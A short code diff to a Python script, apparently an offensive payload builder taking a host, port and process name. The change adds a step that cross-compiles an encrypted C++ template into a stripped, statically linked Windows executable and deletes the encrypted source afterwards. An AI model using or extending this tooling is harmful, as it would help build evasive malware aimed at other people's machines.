@@ -142,7 +142,17 @@ def run_peekaboo(host, port, proc_name):
     tmp.close()
 
     print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
-    print (Colors.GREEN + "compile via compile-inj.bat" + Colors.ENDC)
+
+    try:
+        cmd = "x86_64-w64-mingw32-gcc -O2 peekaboo-enc.cpp -o peekaboo.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
+        os.system(cmd)
+        os.remove("peekaboo-enc.cpp")
+    except:
+        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
+        sys.exit()
+    else:
+        print (Colors.YELLOW + cmd + Colors.ENDC)
+        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
